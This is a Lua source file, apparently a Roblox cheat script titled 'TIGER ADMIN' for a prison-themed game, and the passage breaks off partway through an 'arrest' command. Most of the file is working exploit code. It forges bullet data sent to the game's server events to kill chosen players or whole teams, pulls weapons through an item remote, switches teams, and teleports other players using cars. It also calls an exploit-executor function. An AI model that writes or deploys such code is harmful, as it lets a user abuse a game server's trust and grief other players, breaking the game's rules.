0\nMain.Position = UDim2.new(0, 0, 0.245635912, 0)\nMain.Size = UDim2.new(0, 311, 0, 440)\nUICorner.CornerRadius = UDim.new(0, 3)\nUICorner.Parent = Main\nCommandsList.Name = \"CommandsList\"\nCommandsList.Parent = Main\nCommandsList.Active = true\nCommandsList.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\nCommandsList.BackgroundTransparency = 1.000\nCommandsList.BorderColor3 = Color3.fromRGB(0, 0, 0)\nCommandsList.BorderSizePixel = 0\nCommandsList.Position = UDim2.new(0.0311283227, 0, 0.076167196, 0)\nCommandsList.AutomaticCanvasSize = Enum.AutomaticSize.Y\nCommandsList.Size = UDim2.new(0, 286, 0, 345)\nCommandsList.BottomImage = \"rbxassetid://5168609593\"\nCommandsList.MidImage = \"rbxassetid://5168609593\"\nCommandsList.ScrollBarImageTransparency = 0.510\nCommandsList.ScrollBarThickness = 6\nCommandsList.TopImage = \"rbxassetid://5168609593\"\nUIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border\nUIStroke.Color = Color3.fromRGB(255, 255, 255)\nUIStroke.Transparency = 0.680\nUIStroke.Parent = CommandsList\nUIListLayout.Parent = CommandsList\nUIListLayout.SortOrder = Enum.SortOrder.LayoutOrder\nUIListLayout.Padding = UDim.new(0, 4)\nUIStroke_2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border\nUIStroke_2.Color = Color3.fromRGB(255, 255, 255)\nUIStroke_2.Transparency = 0.680\nUIStroke_2.Parent = Main\nCommandBar.Name = \"CommandBar\"\nCommandBar.Parent = Main\nCommandBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\nCommandBar.BackgroundTransparency = 1.000\nCommandBar.BorderColor3 = Color3.fromRGB(0, 0, 0)\nCommandBar.BorderSizePixel = 0\nCommandBar.Position = UDim2.new(0.0289389063, 0, 0.890909076, 0)\nCommandBar.Size = UDim2.new(0, 289, 0, 39)\nCommandBar.ClearTextOnFocus = false\nCommandBar.Font = Enum.Font.SourceSans\nCommandBar.PlaceholderText = \"Input Commands here!\"\nCommandBar.Text = \"\"\nCommandBar.TextColor3 = Color3.fromRGB(223, 223, 223)\nCommandBar.TextSize = 14.000\nUIStroke_3.ApplyStrokeMode = Enum.ApplyStrokeMode.Border\nUIStroke_3.Color = Color3.fromRGB(255, 255, 255)\nUIStroke_3.Transparency = 0.680\nUIStroke_3.Parent = CommandBar\nTitle.Name = \"Title\"\nTitle.Parent = Main\nTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\nTitle.BackgroundTransparency = 1.000\nTitle.BorderColor3 = Color3.fromRGB(0, 0, 0)\nTitle.BorderSizePixel = 0\nTitle.Position = UDim2.new(0.0311283227, 0, 0.0147420019, 0)\nTitle.Size = UDim2.new(0, 301, 0, 16)\nTitle.Font = Enum.Font.Gotham\nTitle.Text = \"TIGER ADMIN\"\nTitle.TextColor3 = Color3.fromRGB(255, 255, 255)\nTitle.TextScaled = true\nTitle.TextSize = 14.000\nTitle.TextWrapped = true\nDisc.Name = \"Disc\"\nDisc.Parent = Main\nDisc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\nDisc.BackgroundTransparency = 1.000\nDisc.BorderColor3 = Color3.fromRGB(0, 0, 0)\nDisc.BorderSizePixel = 0\nDisc.Position = UDim2.new(0, 0, 1, 0)\nDisc.Size = UDim2.new(0, 311, 0, 27)\nDisc.Visible = false\nDisc.Font = Enum.Font.SourceSans\nDisc.Text = \"Description: Kills a certain player\"\nDisc.TextColor3 = Color3.fromRGB(255, 255, 255)\nDisc.TextSize = 14.000\nDisc.TextStrokeTransparency = 0.650\nTemp_Clone.Name = \"Temp_Clone\"\nTemp_Clone.Parent = TigerAdmin_UI\nTemp_Clone.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\nTemp_Clone.BackgroundTransparency = 1.000\nTemp_Clone.BorderColor3 = Color3.fromRGB(0, 0, 0)\nTemp_Clone.BorderSizePixel = 0\nTemp_Clone.Size = UDim2.new(0, 286, 0, 28)\nTemp_Clone.Visible = false\nTemp_Clone.AutoButtonColor = false\nTemp_Clone.Font = Enum.Font.Gotham\nTemp_Clone.Text = \"!kill <player>\"\nTemp_Clone.TextColor3 = Color3.fromRGB(203, 203, 203)\nTemp_Clone.TextSize = 14.000\nTemp_Clone.TextWrapped = true\nUIStroke_4.ApplyStrokeMode = Enum.ApplyStrokeMode.Border\nUIStroke_4.Color = Color3.fromRGB(255, 255, 255)\nUIStroke_4.Transparency = 0.680\nUIStroke_4.Parent = Temp_Clone\nNotif.Name = \"Notif\"\nNotif.Parent = TigerAdmin_UI\nNotif.BackgroundColor3 = Color3.fromRGB(22, 22, 22)\nNotif.BorderColor3 = Color3.fromRGB(0, 0, 0)\nNotif.BorderSizePixel = 0\nNotif.Position = UDim2.new(0.00780572416, 0, 0.152119696, 0)\nNotif.Size = UDim2.new(0, 222, 0, 58)\nNotif.Visible = false\nUIStroke_5.ApplyStrokeMode = Enum.ApplyStrokeMode.Border\nUIStroke_5.Color = Color3.fromRGB(255, 255, 255)\nUIStroke_5.Thickness = 0.700\nUIStroke_5.Transparency = 0.680\nUIStroke_5.Parent = Notif\nUICorner_2.CornerRadius = UDim.new(0, 3)\nUICorner_2.Parent = Notif\nText.Name = \"Text\"\nText.Parent = Notif\nText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\nText.BackgroundTransparency = 1.000\nText.BorderColor3 = Color3.fromRGB(0, 0, 0)\nText.BorderSizePixel = 0\nText.Size = UDim2.new(0.972972989, 0, 1, 0)\nText.Font = Enum.Font.SourceSans\nText.Text = \"Error! Jeffcool in game spotted please leave!\"\nText.TextColor3 = Color3.fromRGB(190, 190, 190)\nText.TextScaled = true\nText.TextSize = 14.000\nText.TextWrapped = true\nUITextSizeConstraint.Parent = Text\nUITextSizeConstraint.MaxTextSize = 14\nlocal AllowFocus = false\nTemp.OrginPosMain = Main.Position\nTemp.OrginPosMainGone = Temp.OrginPosMain+UDim2.new(-.3,0,0,0)\nTemp.NotifOldPos = Notif.Position\nMain:TweenPosition(Temp.OrginPosMainGone,\"Out\",\"Quart\")\nplr = game:GetService(\"Players\").LocalPlayer\n\n-- Services --\nlocal Players = game:GetService(\"Players\")\nlocal ReplicatedStorage = game:GetService(\"ReplicatedStorage\")\nlocal TweenService = game:GetService(\"TweenService\")\n\n-- Player --\nlocal Player = Players.LocalPlayer\nlocal Character, Humanoid, HRP\n-- API --\nlocal Remote = workspace:WaitForChild(\"Remote\")\nlocal API, Commands, States = {}, {}, {}\nlocal Settings = {\n\tPrefix = \"!\"\n}\nStates.Unloaded = false\ngame:GetService(\"UserInputService\").InputEnded:Connect(function(Key,c)\n\tif States.Unloaded == false then\n\t\tif Key.KeyCode == Enum.KeyCode.Semicolon and not c then\n\t\t\tMain:TweenPosition(Temp.OrginPosMain,\"Out\",\"Quart\",.38)\n\t\t\tCommandBar:CaptureFocus()\n\t\t\twait(.5)\n\t\t\tAllowFocus = true\n\t\tend\n\t\tif Key.UserInputType == Enum.UserInputType.MouseButton1 and not c then\n\t\t\tif not Temp.OnGui then\n\t\t\t\tAllowFocus = false\n\t\t\tend\n\t\tend\n\tend\nend)\nMain.MouseLeave:Connect(function()\n\tTemp.OnGui = false\n\tDisc.Visible = false\nend)\nMain.MouseEnter:Connect(function()\n\tTemp.OnGui = true\nend)\ncoroutine.wrap(function()\n\twhile wait() do\n\t\tif AllowFocus then\n\t\t\trepeat task.wait() until not AllowFocus\n\t\t\tMain:TweenPosition(Temp.OrginPosMainGone,\"Out\",\"Quart\",.38)\n\t\t\tDisc.Visible = false\n\t\tend\n\tend\nend)()\n\nAPI.StringArgsChecker = function(Text)\n\tlocal List = {\"all\",\"others\",\"me\"}\n\tlocal Ts = game.Teams:GetChildren()\n\tfor i,v in pairs(Ts) do\n\t\tTs[i] = v.Name:lower()\n\tend\n\tif (table.find(List,Text:lower())) then\n\t\treturn (table.find(List,Text:lower()) and true)\n\tend\n\tif table.find(Ts,Text) then\n\t\treturn \"Team\"\n\tend\n\treturn nil\nend\n\nAPI.Tween = function(Obj,Prop,New,Time)\n\tif not Time then Time = .5 end\n\tlocal Tweened = game:GetService(\"TweenService\"):Create(Obj, TweenInfo.new( Time, Enum.EasingStyle.Quart, Enum.EasingDirection.Out, 0, false,0), {[Prop] = New,})\n\tTweened:Play()\n\treturn {Stop = function() Tweened:Cancel() end, }\nend\nTemp.CMDA = 0\nAPI.AddCommand = function(Name, Function, Setting)\n\tTemp.CMDA  = Temp.CMDA +1\n\tlocal Alts = \"\"\n\tCommands[Name:lower()] = {f = Function,}\n\tif Setting[\"Alt\"] then\n\t\tfor i,v in pairs(Setting[\"Alt\"]) do\n\t\t\tif v and tostring(v) then\n\t\t\t\tCommands[v] = Commands[Name:lower()]\n\t\t\t\tAlts = Alts..\"/!\"..v\n\t\t\tend\n\t\tend\n\tend\n\tlocal CommandLabel = Temp_Clone:Clone()\n\tif Setting[\"Type\"] then Setting[\"Type\"] = Setting[\"Type\"]:lower() end\n\tif Setting[\"Type\"] and Setting[\"Type\"] == \"toggle\" then\n\t\tSetting[\"Type\"] = \"<ON/OFF>\"\n\telseif Setting[\"Type\"] and Setting[\"Type\"] == \"player\" then\n\t\tSetting[\"Type\"] = \"<Player>\"\n\telseif Setting[\"Type\"] and Setting[\"Type\"] == \"all\" then\n\t\tSetting[\"Type\"] = \"<Player,All,Me>\"\n\telseif Settings and Settings[\"Type\"] ~=nil then\n\t\tSetting[\"Type\"] = \"<\"..Setting[\"Type\"]..\">\"\n\telse\n\t\tSetting[\"Type\"] = \"\"\n\t\n\tend\n\t\n\tCommandLabel.Text = Settings.Prefix..Name..Alts..\" \"..Setting[\"Type\"]\n\tCommandLabel.Visible = true\n\tCommandLabel.Parent = CommandsList\n\tCommandLabel.MouseButton1Up:Connect(function()\n\t\tCommandBar.Text = Settings.Prefix..Name\n\t\tCommandBar:CaptureFocus()\n\tend)\n\tCommandLabel.MouseEnter:Connect(function()\n\t\tAPI.Tween(CommandLabel,\"BackgroundTransparency\",.67,.4)\n\t\tDisc.Visible = true\n\t\tDisc.Text = Setting[\"Description\"]\n\tend)\n\tCommandLabel.MouseLeave:Connect(function()\n\t\tAPI.Tween(CommandLabel,\"BackgroundTransparency\",1,.4)\n\tend)\nend\nAPI.FindPlayer =function(String,IgnoreError)\n\tif not String then\n\t\treturn nil\n\tend\n\tif String:lower() == \"me\" then\n\t\treturn plr\n\tend\n\tString = String:gsub(\"%s+\", \"\")\n\tfor _, v in pairs(game:GetService(\"Players\"):GetPlayers()) do\n\t\tif v.Name:lower():match(\"^\" .. String:lower()) or v.DisplayName:lower():match(\"^\" .. String:lower()) then\n\t\t\treturn v\n\t\tend\n\tend\n\tif not IgnoreError then\n\t\tAPI.Notify(\"No players in server matching the name '\"..String..\"'\")\n\tend\n\treturn nil\nend\nAPI.FindCommand = function(cmd)\n\tcmd=string.gsub(cmd,\"!\",\"\")\n\tlocal Command = Commands[cmd]\n\tif Command then\n\t\treturn Command.f\n\tend\n\treturn Command\nend\n\nAPI.Notify = function(Text,Dur)\n\tpcall(function()\n\t\tlocal a = Instance.new(\"ScreenGui\",PreferedParent)\n\t\tlocal NotifNew = Notif:Clone()\n\t\tNotifNew.Visible = true\n\t\tNotifNew.Parent = a\n\t\tNotifNew.Position = Temp.NotifOldPos-UDim2.new(1,0,0,0)\n\t\ttask.spawn(function()\n\t\t\tNotifNew:TweenPosition(Temp.NotifOldPos,\"Out\",\"Quart\",.8)\n\t\t\tNotifNew:FindFirstChild(\"Text\").Text = Text or \"No notification text given.\"\n\t\t\twait((Dur) or 3)\n\t\t\tNotifNew:TweenPosition(Temp.NotifOldPos-UDim2.new(1,0,0,0),\"Out\",\"Quart\",.8)\n\t\t\twait(.9)\n\t\t\tNotifNew:Destroy()\n\t\tend)\n\tend)\nend\nAPI.GetGun =function(Item)\n\ttask.spawn(function()\n\t\tlocal isAlreadyThere = plr.Backpack:FindFirstChild(Item) or plr.Character:FindFirstChild(Item)\n\t\tif isAlreadyThere then\n\t\t\treturn isAlreadyThere\n\t\telse\n\t\t\tpcall(function()\n\t\t\t\ttask.spawn(function()\n\t\t\t\t\tworkspace:FindFirstChild(\"Remote\")['ItemHandler']:InvokeServer({Position = Player.Character.Head.Position,Parent = workspace.Prison_ITEMS:FindFirstChild(Item, true)})\n\t\t\t\tend)\n\t\t\tend)\n\t\tend\n\tend)\nend\nAPI.MoveTo = function(Cframe)\n\tif typeof(Cframe):lower() == \"position\" then Cframe = CFrame.new(Cframe) end\n\tfor i =1,3 do\n\t\ttask.wait()\n\t\tplr.Character:FindFirstChild(\"HumanoidRootPart\").CFrame = Cframe\n\tend\nend\nAPI.IsFound = function(Name)\n\tlocal t = (plr.Backpack:FindFirstChild(Name) or plr.Character:FindFirstChild(Name))\n\tif t and t:IsA(\"Tool\") then\n\t\treturn t\n\tend\n\treturn nil\nend\nAPI.GetPosition = function()\n\treturn plr.Character:FindFirstChild(\"HumanoidRootPart\").CFrame\nend\nAPI.TestA = function()\n\tfor i =1,10 do --//STOP IT HOLY SHIT WHY WONT IT WORK\n\t\tTemp.Respawned:Disconnect()\n\tend\n\tTemp.Respawned = nil\nend\nfunction API.Refresh(Team,Position,NoForce) --// v2.0\n\tif typeof(Position):lower() == \"position\" then Position = CFrame.new(Position) end\n\tlocal LastPosition = API.GetPosition()\n\tlocal LastCameraPosition = workspace.CurrentCamera.CFrame\n\tif not Team then Team = plr.Team end\n\tlocal done = false\n\tTemp.Respawned = plr.CharacterAdded:Connect(function(c)\n\t\tif done then return end\n\t\tdone = true\n\t\ttask.spawn(function()\n\t\t\tworkspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable\n\t\t\twait(.1)\n\t\t\tworkspace.CurrentCamera.CameraType = Enum.CameraType.Custom\n\t\t\tworkspace.CurrentCamera.CameraSubject = plr.Character:WaitForChild(\"Humanoid\")\n\n\t\tend)\n\t\ttask.spawn(function()\n\t\t\tc:WaitForChild(\"ForceField\"):Destroy()\n\t\tend)\n\t\tfor i =1,3 do\n\t\t\tc:WaitForChild(\"HumanoidRootPart\").CFrame = LastPosition\n\t\t\tgame:GetService(\"RunService\").Stepped:Wait()\n\t\tend\n\t\tAPI.TestA()\n\t\tPosition = nil--// why the fuck it keep spawning somewhere else!!!! GRRRRR\n\t\tNoForce = nil\n\t\tLastCameraPosition = nil\n\t\tTeam = nil\n\tend)\n\tif Team ~= game.Teams.Criminals then\n\t\tPosition = Position\n\t\tworkspace.Remote.TeamEvent:FireServer(Team.TeamColor.Name)\n\telse\n\t\trepeat\n\t\t\tgame:GetService(\"RunService\").Stepped:Wait()\n\t\t\tif firetouchinterest then\n\t\t\t\tfiretouchinterest(plr.Character:FindFirstChildOfClass(\"Part\"), game:GetService(\"Workspace\")[\"Criminals Spawn\"]:GetChildren()[1], 0)\n\t\t\t\tfiretouchinterest(plr.Character:FindFirstChildOfClass(\"Part\"), game:GetService(\"Workspace\")[\"Criminals Spawn\"]:GetChildren()[1], 1)\n\t\t\tend\n\t\t\tgame:GetService(\"Workspace\")[\"Criminals Spawn\"]:GetChildren()[1].Transparency = 1\n\t\t\tgame:GetService(\"Workspace\")[\"Criminals Spawn\"]:GetChildren()[1].CanCollide = false\n\t\t\tgame:GetService(\"Workspace\")[\"Criminals Spawn\"]:GetChildren()[1].CFrame = API:GetPosition()\n\t\tuntil plr.Team == game:GetService(\"Teams\").Criminals\n\t\tgame:GetService(\"Workspace\")[\"Criminals Spawn\"]:GetChildren()[1].CFrame = CFrame.new(0, 3125, 0)\n\tend\n\treturn nil\nend\nfunction API.ChangeTeam(Team)\n\tAPI.Refresh(Team,nil,true)\nend\nfunction API.GuardsFull(a)\n\tif #game:GetService(\"Teams\").Guards:GetPlayers()==8 then\n\t\tif a then\n\t\t\tif Player.Team == game.Teams.Guards then\n\t\t\t\treturn false\n\t\t\tend\n\t\tend\n\t\treturn false\n\tend\n\treturn true\nend\nAPI.KillTeam = function(Team)\n\tlocal LastT, Bullets,OrginTeam = nil,{}, plr.Team\n\tlocal function Fire()\n\t\tAPI.GetGun(\"M9\")\n\t\tlocal Gun = plr.Backpack:FindFirstChild(\"M9\")\n\t\trepeat task.wait()\n\t\t\tGun = plr.Backpack:FindFirstChild(\"M9\")\n\t\t\tAPI.GetGun(\"M9\")\n\t\tuntil Gun\n\t\ttask.spawn(function()\n\t\t\tgame:GetService(\"ReplicatedStorage\"):WaitForChild(\"ShootEvent\"):FireServer(Bullets, Gun)\n\t\t\tgame:GetService(\"ReplicatedStorage\").ReloadEvent:FireServer(Gun)\n\t\tend)\n\tend\n\tif Team ~= \"all\" then\n\t\tfor i,v in pairs(game:GetService(\"Players\"):GetPlayers()) do\n\t\t\tif v and v ~= plr and v.Team == Team then\n\t\t\t\tfor i =1,15 do\n\t\t\t\t\tBullets[#Bullets+1] = {\n\t\t\t\t\t\t[\"RayObject\"] = Ray.new(Vector3.new(), Vector3.new()),\n\t\t\t\t\t\t[\"Distance\"] = 0,\n\t\t\t\t\t\t[\"Cframe\"] = CFrame.new(),\n\t\t\t\t\t\t[\"Hit\"] = v.Character:FindFirstChild(\"Head\"),\n\t\t\t\t\t}\n\t\t\t\tend\n\t\t\tend\n\t\tend\n\t\tif Team ~= game.Teams.Inmates then\n\t\t\tAPI.ChangeTeam(game.Teams.Inmates)\n\t\telse\n\t\t\tAPI.ChangeTeam(game.Teams.Criminals)\n\t\tend\n\t\twait(.1)\n\t\tFire()\n\t\twait(.5)\n\t\tif plr.Team ~=OrginTeam then\n\t\t\tAPI.ChangeTeam(OrginTeam)\n\t\tend\n\telse\n\t\tfor i,v in pairs(game:GetService(\"Players\"):GetPlayers()) do\n\t\t\tif v and v ~= plr and v.Character then\n\t\t\t\tfor i =1,15 do\n\t\t\t\t\tBullets[#Bullets+1] = {\n\t\t\t\t\t\t[\"RayObject\"] = Ray.new(Vector3.new(), Vector3.new()),\n\t\t\t\t\t\t[\"Distance\"] = 0,\n\t\t\t\t\t\t[\"Cframe\"] = CFrame.new(),\n\t\t\t\t\t\t[\"Hit\"] = v.Character:FindFirstChild(\"Head\"),\n\t\t\t\t\t}\n\t\t\t\tend\n\t\t\tend\n\t\tend\n\t\tif plr.Team ~= game.Teams.Inmates then\n\t\t\tAPI.ChangeTeam(game.Teams.Inmates)\n\t\tend\n\t\tFire()\n\t\twait(.1)\n\t\tAPI.ChangeTeam(game.Teams.Criminals)\n\t\twait()\n\t\tFire()\n\t\twait(.5)\n\t\tif plr.Team ~=OrginTeam then\n\t\t\tAPI.ChangeTeam(OrginTeam)\n\t\tend\n\tend\n\nend\nAPI.GetCar = function(To)\n\tif not To then To = API.GetPosition() end\n\tlocal Car = nil\n\tlocal L = API.GetPosition()\n\tfor i,v in pairs(game:GetService(\"Workspace\").CarContainer:GetChildren()) do\n\t\tif v and v:IsA(\"Model\") then\n\t\t\tif v:WaitForChild(\"Body\"):WaitForChild(\"VehicleSeat\").Occupant == nil then\n\t\t\t\tCar = v\n\t\t\tend\n\t\tend\n\tend\n\tif not Car then\n\t\tcoroutine.wrap(function()\n\t\t\tif not Car then\n\t\t\t\tCar = game:GetService(\"Workspace\").CarContainer.ChildAdded:Wait()\n\t\t\tend\n\t\tend)()\n\t\tAPI.MoveTo(game:GetService(\"Workspace\").Prison_ITEMS.buttons:GetChildren()[7][\"Car Spawner\"].CFrame*CFrame.new(0,2.5,0))\n\t\twait(.23)\n\t\trepeat task.wait()\n\t\t\ttask.spawn(function()\n\t\t\t\tworkspace.Remote.ItemHandler:InvokeServer(game:GetService(\"Workspace\").Prison_ITEMS.buttons:GetChildren()[7][\"Car Spawner\"])\n\t\t\tend)\n\t\tuntil Car\n\tend\n\trepeat task.wait() until Car\n\tCar:WaitForChild(\"Body\"):WaitForChild(\"VehicleSeat\")\n\tCar.PrimaryPart = Car.Body.VehicleSeat\n\tlocal Seat = Car.Body.VehicleSeat\n\tAPI.MoveTo(To)\n\trepeat task.wait()\n\t\tCar:SetPrimaryPartCFrame(To)\n\t\tSeat:Sit(plr.Character:FindFirstChildOfClass(\"Humanoid\"))\n\tuntil plr.Character:FindFirstChildOfClass(\"Humanoid\").Sit == true\n\tCar:SetPrimaryPartCFrame(To)\n\tplr.Character:FindFirstChildOfClass('Humanoid').Sit = false\n\twait()\n\tAPI.MoveTo(L)\nend\nAPI.FindShield = function()\n\tlocal Shield = Players:FindFirstChild(\"Riot Shield\", true)\n\tif not Shield then\n\t\tfor _,Target in pairs(Players:GetPlayers()) do\n\t\t\tif Target.Character and Target.Character:FindFirstChild(\"Riot Shield\") then\n\t\t\t\tShield = Target.Character[\"Riot Shield\"]\n\t\t\t\tbreak\n\t\t\tend\n\t\tend\n\tend\n\treturn Shield\nend\nAPI.Bring = function(Target,TeleportTo)\n\tif not TeleportTo then TeleportTo = API.GetPosition() end\n\tlocal CarSelected = nil\n\tlocal Seat = nil\n\tlocal Attempts = 0\n\tfor i,v in pairs(game:GetService(\"Workspace\").CarContainer:GetChildren()) do\n\t\tif v then\n\t\t\tif v:WaitForChild(\"Body\"):WaitForChild(\"VehicleSeat\").Occupant == nil then\n\t\t\t\tCarSelected = v\n\t\t\tend\n\t\tend\n\tend\n\tif not CarSelected then\n\t\tcoroutine.wrap(function()\n\t\t\tif not CarSelected then\n\t\t\t\tCarSelected = game:GetService(\"Workspace\").CarContainer.ChildAdded:Wait()\n\t\t\tend\n\t\tend)()\n\t\tAPI.MoveTo(game:GetService(\"Workspace\").Prison_ITEMS.buttons:GetChildren()[7][\"Car Spawner\"].CFrame*CFrame.new(0,2.5,0))\n\t\twait(.23)\n\t\trepeat task.wait()\n\t\t\ttask.spawn(function()\n\t\t\t\tworkspace.Remote.ItemHandler:InvokeServer(game:GetService(\"Workspace\").Prison_ITEMS.buttons:GetChildren()[7][\"Car Spawner\"])\n\t\t\tend)\n\t\tuntil CarSelected\n\tend\n\trepeat game:GetService(\"RunService\").RenderStepped:Wait() until CarSelected ~= nil\n\tif CarSelected then\n\t\tCarSelected:WaitForChild(\"Body\"):WaitForChild(\"VehicleSeat\")\n\t\tCarSelected.PrimaryPart = CarSelected.Body.VehicleSeat\n\t\tSeat = CarSelected.Body.VehicleSeat\n\t\tCarSelected:SetPrimaryPartCFrame(plr.Character:GetPrimaryPartCFrame())\n\t\trepeat task.wait()\n\t\t\tSeat:Sit(plr.Character:FindFirstChildOfClass(\"Humanoid\"))\n\t\tuntil plr.Character:FindFirstChildOfClass(\"Humanoid\").Sit == true\n\t\trepeat game:GetService(\"RunService\").RenderStepped:Wait()\n\t\t\tAttempts = Attempts+1\n\t\t\tif not Target.Character or Target.Character:FindFirstChildOfClass(\"Humanoid\").Health <1 then\n\t\t\t\tbreak\n\t\t\tend\n\t\t\tCarSelected:SetPrimaryPartCFrame(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,-.2,-5))\n\t\tuntil Target.Character:FindFirstChildOfClass(\"Humanoid\").Sit == true or Attempts >500\n\t\tfor i =1,5 do\n\t\t\ttask.wait()\n\t\t\tCarSelected:SetPrimaryPartCFrame(TeleportTo)\n\t\tend\n\tend\nend\n\nAPI.Kill = function(Target,Attempt,StopChangeTeam)\n\tlocal ChangeTeam = nil\n\tif Target.Team == plr.Team then\n\t\tChangeTeam = plr.Team\n\t\tif Target.Team ~= game.Teams.Inmates then\n\t\t\tAPI.Refresh(game.Teams.Inmates,API.GetPosition(),true)\n\t\telseif Target.Team ~= game.Teams.Criminals then\n\t\t\tAPI.Refresh(game.Teams.Criminals,API.GetPosition(),true)\n\t\telse\n\t\t\tAPI.Refresh(game.Teams.Inmates,API.GetPosition(),true)\n\t\tend\n\tend\n\tif Target == plr then\n\t\tplr.Character:FindFirstChildOfClass(\"Humanoid\").Health = 0\n\t\treturn \n\tend\n\tlocal BulletTable = {}\n\tif Target.Character:FindFirstChildOfClass(\"Humanoid\") and Target.Character:FindFirstChildOfClass(\"Humanoid\").Health <1 then\n\t\treturn\n\tend\n\tlocal PewPew = nil\n\tfor i =1,15 do\n\t\tBulletTable[#BulletTable+1] = {\n\t\t\t[\"RayObject\"] = Ray.new(Vector3.new(), Vector3.new()),\n\t\t\t[\"Distance\"] = 0,\n\t\t\t[\"Cframe\"] = CFrame.new(),\n\t\t\t[\"Hit\"] = Target.Character:FindFirstChild(\"Head\"),\n\t\t}\n\tend\n\trepeat API.GetGun(\"Remington 870\") game:GetService(\"RunService\").RenderStepped:Wait() PewPew = Player.Backpack:FindFirstChild(\"Remington 870\") or Player.Character:FindFirstChild(\"Remington 870\") until PewPew\n\ttask.spawn(function()\n\t\tgame:GetService(\"ReplicatedStorage\"):WaitForChild(\"ShootEvent\"):FireServer(BulletTable, PewPew)\n\t\tgame:GetService(\"ReplicatedStorage\").ReloadEvent:FireServer(PewPew)\n\tend)\n\twait(.25)\n\tif Target.Character:FindFirstChildOfClass(\"Humanoid\").Health >0 then\n\t\twait(.4)\n\t\ttask.spawn(function()\n\t\t\tgame:GetService(\"ReplicatedStorage\"):WaitForChild(\"ShootEvent\"):FireServer(BulletTable, PewPew)\n\t\t\tgame:GetService(\"ReplicatedStorage\").ReloadEvent:FireServer(PewPew)\n\t\tend)\n\t\twait(.25)\n\t\tif not StopChangeTeam then\n\t\t\tAPI.Refresh(ChangeTeam,API.GetPosition(),true)\n\t\tend\n\t\treturn\n\tend\n\tif ChangeTeam and not StopChangeTeam then\n\t\tAPI.Refresh(ChangeTeam,API.GetPosition(),true)\n\tend\nend\nAPI.Guns = function()\n\tif game:GetService(\"MarketplaceService\"):UserOwnsGamePassAsync(plr.UserId, 96651) then\n\t\tAPI.GetGun(\"M4A1\")\n\tend\n\tAPI.GetGun(\"AK-47\")\n\ttask.spawn(function()\n\t\tAPI:GetGun(\"Remington 870\")\n\tend)\n\tAPI:GetGun(\"M9\")\nend\nAPI.ChangeToggle = function(Name,arg2)\n\tif States[Name] == nil then\n\t\tStates[Name] = false\n\tend\n\tif States[Name] ~= nil then\n\t\tif arg2 then\n\t\t\tif arg2 == \"on\" then\n\t\t\t\tStates[Name] = true\n\t\t\telseif arg2 == \"off\" then\n\t\t\t\tStates[Name] = false\n\t\t\tend\n\t\t\treturn\n\t\tend\n\t\tStates[Name] = not States[Name]\n\tend\nend\nAPI.ExecuteCommand = function(Text)\n\tif States.Unloaded then return end\n\tif string.sub(Text, #Settings.Prefix, 1) ~= Settings.Prefix then\n\t\treturn\n\tend\n\tText=Text:lower()\n\tlocal Split = string.split(Text, \" \")\n\tlocal Command = API.FindCommand(Split[1])\n\tif not Command then\n\t\tAPI.Notify(\"No command found under '\"..Text:split(\" \")[1]..\"'\")\n\t\treturn\n\tend\n\tlocal Success, Error = pcall(task.spawn,Command, Split)\n\tif not Success then\n\t\twarn(\"--// TIGER ADMIN ERROR \\\\\\\\\\--\\nCommand: \"..Text:split(\" \")[1]..\"\\n\"..Error)\n\tend\nend\n---\nfunction API.BadArea(Player)\n\tlocal mod = require(game.ReplicatedStorage[\"Modules_client\"][\"RegionModule_client\"])\n\tlocal a = pcall(function()\n\t\tif mod.findRegion(Player.Character) then\n\t\t\tmod = mod.findRegion(Player.Character)[\"Name\"]\n\t\tend\n\tend)\n\tif not a then\n\t\treturn\n\tend\n\tfor i, v in pairs(game:GetService(\"ReplicatedStorage\").PermittedRegions:GetChildren()) do\n\t\tif v and mod == v.Value then\n\t\t\treturn false\n\t\tend\n\tend\n\treturn true\nend\n-- Commands --\nAPI.AddCommand(\"unload\", function(Args)\n\tStates = {}\n\tStates.Unloaded = true\n\tAPI.Notify(\"Unloaded Gui, States and stopped most loops.\")\n\tMain:TweenPosition(Main.Position+UDim2.new(0,0,1,0),\"In\",\"Back\",.45)\n\twait(.46)\n\tTigerAdmin_UI:Destroy()\nend,{[\"Description\"] = \"Unloads the script\",})\nAPI.AddCommand(\"fix\", function(Args)\n\tif Temp.ViewingPlayer then\n\t\tTemp.ViewingPlayer:Disconnect()\n\tend\n\tworkspace.CurrentCamera.CameraType = Enum.CameraType.Custom\n\tworkspace.CurrentCamera.CameraSubject = plr.Character.Humanoid\n\tplr.Character:WaitForChild(\"HumanoidRootPart\").Anchored = false\n\tplr.Character:WaitForChild(\"Humanoid\").WalkSpeed = 16\nend,{[\"Description\"] = \"Fixes Camera and player character\",})\n----------------------------------------------------------// <PLAYER> / <ALL> COMMANDS\nAPI.AddCommand(\"kill\", function(Args)\n\tif Args[2] then\n\t\tlocal t = {}\n\t\tlocal index = {}\n\t\tfor i,v in pairs(game:GetService(\"Teams\"):GetChildren()) do\n\t\t\ttable.insert(t,v.Name:lower())\n\t\t\ttable.insert(index,v)\n\t\tend\n\t\tif table.find(t,Args[2]) then\n\t\t\tAPI.KillTeam(index[table.find(t,Args[2])])\n\t\t\treturn\n\t\tend\n\t\tif API.StringArgsChecker(Args[2]) == nil then\n\t\t\tlocal Target = API.FindPlayer(Args[2])\n\t\t\tif Target then\n\t\t\t\tAPI.Kill(Target)\n\t\t\tend\n\t\telse\n\t\t\tAPI.KillTeam(\"all\")\n\t\tend\n\tend\nend,{[\"Description\"] = \"Kills player(s)\",[\"Type\"] = \"all\",})\nAPI.AddCommand(\"arrest\", function(Args)\n\tif Args[2] and Args[2] == \"all\" then\n\t\tlocal LastPosition = API.GetPosition()\n\t\tfor i,v in pairs(game:GetService(\"Players\"):GetPlayers()) do\n\t\t\tif v and v~= game:GetService(\"Players\").LocalPlayer and v.Team == game.Teams.Criminals or (API:BadArea(v) and v.Team == game.Teams.Inmates) and v.Character.PrimaryPart and v.Character:FindFirstChildOfClass(\"Humanoid\").Health>0 then\n\t\t\t\trepeat 